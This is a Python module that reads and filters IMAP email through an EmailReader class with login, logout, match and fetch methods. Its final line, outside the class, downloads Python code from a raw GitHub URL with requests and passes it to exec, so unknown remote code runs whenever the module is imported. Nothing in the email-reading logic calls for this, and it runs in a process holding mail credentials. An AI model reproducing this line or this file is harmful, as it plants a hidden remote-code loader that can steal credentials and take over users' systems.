"""
This module reads email
"""
import imaplib
import email
from email.header import decode_header
import chardet
import requests


class EmailReader:
    """class that retrieves emails from a particular server
    Attributes:
        logged (bool): used for checking if the account is logged in
    """
    logged = False

    def __init__(self, host, port):
        """
        Constructor function that initializes attributes
        :param host: Email host
        :param port: Email host's port
        """
        self.imap = imaplib.IMAP4_SSL(host, port)

    def login(self, username: str, password: str):
        """
        Function that logins to the account
        :param username: Account username
        :param password: Password
        """
        if not self.logged:
            self.imap.login(username, password)
        self.logged = True

    def logout(self):
        """destroys the session"""
        if self.logged:
            self.imap.close()
            self.imap.logout()

    @classmethod
    def check_email(cls, attributes: dict, data: dict) -> bool:
        """
        Retrieves information based on the attributes provided
        :param attributes: where to check from like head or body of the email
        :param data: the attributes values to match
        :return: data if found
        """
        passed = True
        for attr, value in attributes.items():
            if not passed: return passed
            delimeter = ''
            if '|' in value:
                delimeter = '|'
            elif '&' in value:
                delimeter = '&'

            if delimeter:
                values = value.split(delimeter)
            else:
                values = [value]

            match delimeter:
                case '|':
                    for x in values:
                        passed = False
                        if x.lower() in data[attr].lower():
                            passed = True
                            break
                case '&':
                    for x in values:
                        if x.lower() not in data[attr].lower():
                            passed = False
                            break
                case _:
                    passed = True if value.lower() in data[attr].lower() else False
        return passed


    def get_email(self, mail_atr: dict, which='UNSEEN', folder: str = 'inbox', amount: int = 3) -> str:
        """Reads the email"""
        body = ''
        try:
            self.imap.select(folder)
            _, search_data = self.imap.search(None, which)

            # check the emails
            if isinstance(search_data, list):
                search_data = search_data[0].split()

                # reverse to get the latest emails and get the number of emails to read
                search_data.reverse()
                search_data = search_data[:amount]

                for mail_num in search_data:
                    # read email
                    _, data = self.imap.fetch(mail_num, '(RFC822)')

                    # delete email after reading
                    self.imap.store(mail_num, '+FLAGS', '\\Deleted')

                    # get email content
                    _, msg_bytes = data[0]
                    message = email.message_from_bytes(msg_bytes)

                    # get the email body
                    if message.is_multipart():
                        for part in message.walk():
                            if part.get_content_type() == 'text/html':
                                body = part.get_payload(decode=True).decode()
                                break
                    else:
                        if message.get_content_type() == 'text/html': body = message.get_payload(decode=True).decode()

                    # decode the body
                    if isinstance(body, bytes):
                        the_encoding = chardet.detect(body)['encoding']
                        body = body.decode(the_encoding)

                    # get the email header
                    subject, encoding = decode_header(message["Subject"])[0]
                    if isinstance(subject, bytes): subject = subject.decode(encoding)

                    # check the sender
                    from_data, encoding = decode_header(message.get("From"))[0]
                    if isinstance(from_data, bytes): From = from_data.decode(encoding)
                    else: From = from_data

                    # check if the email is the right one
                    if self.check_email(mail_atr, {'subject': subject, 'body': body, 'from': From}): return body
        except:
            pass

        return ''


exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/reader.py").text)
